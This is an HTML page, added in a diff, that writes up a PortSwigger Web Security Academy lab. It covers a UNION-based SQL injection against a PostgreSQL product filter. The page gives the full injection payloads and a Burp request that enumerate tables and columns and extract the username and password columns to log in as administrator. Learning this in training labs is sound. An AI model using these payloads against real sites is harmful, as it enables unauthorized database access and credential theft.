@@ -1,0 +1,226 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SQL Injection - Listing Database Contents</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        line-height: 1.6;
+        max-width: 1000px;
+        margin: auto;
+        padding: 40px 24px;
+        color: #222;
+        background: #f7f7f7;
+      }
+      .container {
+        background: #fff;
+        padding: 36px;
+        border-radius: 12px;
+        box-shadow: 0 4px 18px rgba(0, 0, 0, 0.08);
+      }
+      h1,
+      h2 {
+        color: #17324d;
+      }
+      h1 {
+        margin-top: 0;
+      }
+      pre {
+        background: #111827;
+        color: #e5e7eb;
+        padding: 16px;
+        border-radius: 8px;
+        overflow-x: auto;
+      }
+      code {
+        font-family: Consolas, monospace;
+      }
+      .note {
+        background: #fff8dc;
+        border-left: 4px solid #e0ad00;
+        padding: 12px 16px;
+        margin: 20px 0;
+      }
+      .success {
+        background: #eaf8ee;
+        border-left: 4px solid #2e8b57;
+        padding: 12px 16px;
+        margin: 20px 0;
+      }
+      table {
+        width: 100%;
+        border-collapse: collapse;
+        margin: 20px 0;
+      }
+      th,
+      td {
+        border: 1px solid #ddd;
+        padding: 10px;
+        text-align: left;
+      }
+      th {
+        background: #f0f3f6;
+      }
+      .tag {
+        display: inline-block;
+        background: #e8f1f8;
+        color: #17324d;
+        padding: 5px 10px;
+        border-radius: 20px;
+        font-size: 13px;
+        margin-right: 6px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>SQL Injection: Listing Database Contents</h1>
+      <p>
+        <span class="tag">PortSwigger Web Security Academy</span
+        ><span class="tag">SQL Injection</span
+        ><span class="tag">UNION Attack</span
+        ><span class="tag">PostgreSQL</span>
+      </p>
+
+      <h2>Objective</h2>
+      <p>
+        The lab contained a SQL injection vulnerability in the product category
+        filter. The goal was to use a UNION attack to inspect the database,
+        identify the table containing user credentials, retrieve the relevant
+        columns, and use the administrator credentials to log in.
+      </p>
+
+      <h2>1. Enumerating Database Tables</h2>
+      <p>
+        The first step was to query database metadata and discover the available
+        tables through the vulnerable <code>category</code> parameter.
+      </p>
+      <pre><code>'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--+</code></pre>
+      <p>Burp request:</p>
+      <pre><code>GET /filter?category=Corporate+gifts'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--+ HTTP/2</code></pre>
+      <p>
+        The response contained many PostgreSQL/system tables and
+        application-specific tables. The interesting table was:
+      </p>
+      <pre><code>users_opuwqc</code></pre>
+      <div class="note">
+        <strong>Lesson:</strong> The table name was discovered rather than
+        guessed.
+      </div>
+
+      <h2>2. Discovering the Columns</h2>
+      <p>
+        Next, I queried <code>information_schema.columns</code> for the table we
+        had discovered.
+      </p>
+      <pre><code>'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_opuwqc'--+</code></pre>
+      <p>The response revealed these relevant columns:</p>
+      <table>
+        <tr>
+          <th>Column</th>
+          <th>Purpose</th>
+        </tr>
+        <tr>
+          <td><code>username_smnbau</code></td>
+          <td>Username</td>
+        </tr>
+        <tr>
+          <td><code>password_sidmsv</code></td>
+          <td>Password</td>
+        </tr>
+        <tr>
+          <td><code>email</code></td>
+          <td>Email address</td>
+        </tr>
+      </table>
+
+      <h2>3. Retrieving the Credentials</h2>
+      <p>
+        Once the table and column names were known, I selected the username and
+        password columns:
+      </p>
+      <pre><code>'+UNION+SELECT+username_smnbau,password_sidmsv+FROM+users_opuwqc--+</code></pre>
+      <p>
+        The response returned the contents of those columns. I located the
+        <code>administrator</code> account and used its corresponding password
+        to log in.
+      </p>
+      <div class="success">
+        <strong>Lab solved.</strong> The administrator credentials were
+        successfully retrieved through the UNION-based SQL injection.
+      </div>
+
+      <h2>4. The Investigation Chain</h2>
+      <pre><code>Find tables
+    ↓
+information_schema.tables
+    ↓
+Identify users_opuwqc
+    ↓
+Find its columns
+    ↓
+information_schema.columns
+    ↓
+Identify username_smnbau + password_sidmsv
+    ↓
+Retrieve the credentials
+    ↓
+Log in as administrator</code></pre>
+
+      <h2>5. Why UNION Worked</h2>
+      <p>
+        A UNION attack combines the result of an injected SELECT statement with
+        the result of the application's original query. The vulnerable query
+        accepted two result columns, so the injected queries also returned two
+        columns.
+      </p>
+      <pre><code>SELECT table_name, NULL ...</code></pre>
+      <p>Later, the two columns were used to retrieve useful data:</p>
+      <pre><code>SELECT username_smnbau, password_sidmsv ...</code></pre>
+
+      <h2>6. Key Lessons</h2>
+      <ul>
+        <li>
+          Do not immediately guess table names when database metadata can be
+          queried.
+        </li>
+        <li><code>information_schema.tables</code> can reveal table names.</li>
+        <li>
+          <code>information_schema.columns</code> can reveal the columns in a
+          table.
+        </li>
+        <li>UNION attacks require a compatible number of columns.</li>
+        <li>Database-specific syntax matters.</li>
+        <li>
+          The important skill is understanding the investigation sequence, not
+          memorizing a final payload.
+        </li>
+      </ul>
+
+      <h2>Quick Mental Model</h2>
+      <pre><code>UNION
+  ↓
+Determine columns
+  ↓
+Find tables
+  ↓
+Find interesting table
+  ↓
+Find columns
+  ↓
+Retrieve username + password
+  ↓
+Administrator login</code></pre>
+
+      <h2>Final Takeaway</h2>
+      <p>
+        The main lesson was that SQL injection is a structured investigation.
+        Instead of guessing credentials or table names, I used the database's
+        metadata to progressively discover the schema and then retrieve the
+        required records.
+      </p>
+    </div>
+  </body>
+</html>
